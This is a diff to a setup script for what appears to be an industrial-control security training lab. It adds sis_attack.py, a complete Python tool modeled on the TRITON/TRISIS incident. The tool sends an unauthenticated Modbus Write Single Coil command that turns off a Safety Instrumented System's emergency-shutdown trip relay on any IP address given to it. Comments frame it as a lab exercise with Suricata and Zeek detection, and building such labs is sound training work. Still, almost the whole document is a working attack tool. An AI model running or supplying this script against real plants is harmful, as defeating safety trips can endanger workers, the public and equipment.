@@ -919,6 +919,168 @@ PYEOF
 
 chmod +x /root/Desktop/Attack_Scripts/iec61850_attack.py
 
+# ── sis_attack.py ────────────────────────────────────────────────────────────────
+# ICS Lab 04 (TRITON/TRISIS): Unauthorized Modbus write to a Safety Instrumented
+# System's trip relay coil. Modeled on the real 2017 XENOTIME/TEMP.Veles attack
+# against a Schneider Electric Triconex SIS at a Saudi petrochemical plant
+# (MITRE ATT&CK for ICS T0831 Manipulation of Control). The real TRITON malware
+# spoke Schneider's proprietary, largely undocumented TriStation protocol via a
+# firmware zero-day — neither of which has a public spec this project could
+# implement accurately (unlike Modbus/DNP3/CIP/MMS, every one of which has a
+# public standard already cited elsewhere in this codebase). This script instead
+# demonstrates the same real root-cause lesson the incident's own post-mortems
+# emphasize: the SIS was reachable, over a standard unauthenticated ICS
+# protocol, from a network position it should never have been exposed to. Same
+# scope cut already made for TriStation in connectionRules.ts.
+cat > /root/Desktop/Attack_Scripts/sis_attack.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+sis_attack.py — Unauthorized Modbus coil write against a Safety Instrumented
+System (SIS), disabling its trip relay. ICS Lab 04 (TRITON/TRISIS).
+
+Writes Modbus Function Code 05 (Write Single Coil) to the SIS's ESD relay
+coil (address 0 by default) — the same write path a legitimate SIS logic
+program uses to de-energize the relay on a real trip, but from an
+unauthorized source. Modbus has no built-in authentication: any host that
+can reach TCP port 502 can issue this command.
+
+Usage:
+    python3 sis_attack.py <sis-ip> [--port 502] [--coil 0] [--restore]
+
+Examples:
+    python3 sis_attack.py 10.200.10.11              # disable the trip relay
+    python3 sis_attack.py 10.200.10.11 --restore     # re-enable it
+"""
+
+import argparse
+import os
+import socket
+import struct
+import sys
+
+
+def build_write_single_coil(transaction_id, unit_id, coil_address, coil_on):
+    """
+    Builds a Modbus/TCP Write Single Coil (FC 0x05) request.
+
+    MBAP header: TransactionID(2) + ProtocolID(2)=0 + Length(2) + UnitID(1)
+    PDU: FunctionCode(1)=0x05 + OutputAddress(2) + OutputValue(2)
+         (0xFF00 = ON, 0x0000 = OFF — per the Modbus Application Protocol spec)
+    """
+    coil_value = 0xFF00 if coil_on else 0x0000
+    pdu = struct.pack(">BHH", 0x05, coil_address, coil_value)
+    length = 1 + len(pdu)  # unit id + PDU
+    mbap = struct.pack(">HHHB", transaction_id, 0x0000, length, unit_id)
+    return mbap + pdu
+
+
+def run_attack(host, port, unit_id, coil_address, coil_on, timeout):
+    action = "RE-ENABLE (restore safe state)" if coil_on else "DISABLE (defeat the safety trip)"
+    print(f"[sis-attack] Target:  {host}:{port}  (Modbus TCP, unit id {unit_id})")
+    print(f"[sis-attack] Command: Write Single Coil (FC 0x05) -> coil {coil_address} -> {action}")
+    print()
+    print("[sis-attack] NOTE: Modbus requires no credentials — any host that can reach")
+    print("[sis-attack] TCP port 502 on this SIS can issue this command. This is the")
+    print("[sis-attack] same root cause the real TRITON/TRISIS incident's post-mortems")
+    print("[sis-attack] identified: the SIS was reachable from a network position it")
+    print("[sis-attack] should have been isolated from (ISA-84 SIS segregation).")
+    print()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    try:
+        sock.connect((host, port))
+    except ConnectionRefusedError:
+        print(f"[sis-attack] ERROR: Connection refused — {host}:{port} is not reachable.")
+        print("[sis-attack] If an IPS reject rule or firewall block is active, this is expected!")
+        sys.exit(2)
+    except socket.timeout:
+        print(f"[sis-attack] ERROR: Connection timed out after {timeout}s.")
+        sys.exit(1)
+    except OSError as exc:
+        print(f"[sis-attack] ERROR: {exc}")
+        sys.exit(1)
+
+    print(f"[sis-attack] TCP connection established to {host}:{port}")
+
+    frame = build_write_single_coil(transaction_id=1, unit_id=unit_id,
+                                     coil_address=coil_address, coil_on=coil_on)
+    print(f"[sis-attack] Sending Write Single Coil frame ({len(frame)} bytes):")
+    print(f"[sis-attack]   Function code:  0x05  (Write Single Coil)")
+    print(f"[sis-attack]   Coil address:   {coil_address}")
+    print(f"[sis-attack]   Coil value:     {'ON (0xFF00)' if coil_on else 'OFF (0x0000)'}")
+    print(f"[sis-attack]   Full frame hex: {frame.hex(' ')}")
+    print()
+    sock.sendall(frame)
+    print("[sis-attack] Write request transmitted — waiting for response ...")
+
+    try:
+        response = sock.recv(12)
+        if response == frame:
+            print("[sis-attack] SIS echoed the write back — coil write CONFIRMED.")
+        elif response:
+            print(f"[sis-attack] Response received: {response.hex(' ')}")
+        else:
+            print("[sis-attack] Server closed connection without responding.")
+    except socket.timeout:
+        print(f"[sis-attack] No response within {timeout}s.")
+        print("[sis-attack] The packet was still delivered — Suricata should have seen it.")
+    except ConnectionResetError:
+        print("[sis-attack] Connection reset by peer while waiting for a response.")
+        print("[sis-attack] If an IPS reject rule is active, this is the expected result —")
+        print("[sis-attack] the write was likely blocked before the SIS could act on it.")
+        sock.close()
+        sys.exit(2)
+
+    sock.close()
+
+    print()
+    print("[sis-attack] ═══════════════════════════════════════════════════════════")
+    print("[sis-attack]  ATTACK COMPLETE")
+    print(f"[sis-attack]  Coil {coil_address} on {host} -> {action}")
+    print("[sis-attack]  Now check: OTForge Monitor -> Suricata tab for the alert.")
+    print("[sis-attack]             OTForge Monitor -> Zeek  tab for the connection log.")
+    print("[sis-attack] ═══════════════════════════════════════════════════════════")
+
+
+def main():
+    default_ip = os.getenv("SIS_IP", "10.200.10.11")
+    parser = argparse.ArgumentParser(
+        description="Modbus SIS trip-relay coil write attack — ICS Lab 04 (TRITON/TRISIS)"
+    )
+    parser.add_argument(
+        "target", nargs="?", default=default_ip,
+        help=f"IP of target SIS (default: {default_ip})"
+    )
+    parser.add_argument("--port", type=int, default=502, help="TCP port (default 502)")
+    parser.add_argument("--unit", type=int, default=1, help="Modbus unit id (default 1)")
+    parser.add_argument(
+        "--coil", type=int, default=0,
+        help="Coil address to write — 0 = ESD relay K1 / trip output (default 0)"
+    )
+    parser.add_argument(
+        "--restore", action="store_true",
+        help="Write ON (restore the safe/enabled state) instead of OFF (disable the trip)"
+    )
+    parser.add_argument("--timeout", type=float, default=5.0, help="Socket timeout in seconds (default 5)")
+    args = parser.parse_args()
+
+    run_attack(
+        host=args.target,
+        port=args.port,
+        unit_id=args.unit,
+        coil_address=args.coil,
+        coil_on=args.restore,
+        timeout=args.timeout,
+    )
+
+
+if __name__ == "__main__":
+    main()
+PYEOF
+
+chmod +x /root/Desktop/Attack_Scripts/sis_attack.py
+
 echo "[otforge-attack] Attack_Scripts created:"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py      — read coil + register state (one-shot)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py      — coil write attack (--restore to undo)"
@@ -926,6 +1088,7 @@ echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py        — re-
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py   — live tank-level bar (--fast for 0.5 s poll)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/dnp3_attack.py     — DNP3 Direct Operate attack (Lab 03)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/iec61850_attack.py — IEC 61850 MMS breaker control attack (IEC 61850 Tutorial)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/sis_attack.py       — Modbus SIS trip-relay coil write attack (Lab 04, TRITON/TRISIS)"
 
 # ── PLC Modbus baseline initialization ────────────────────────────────────────
 # Runs in the background so VNC/noVNC startup is not delayed.
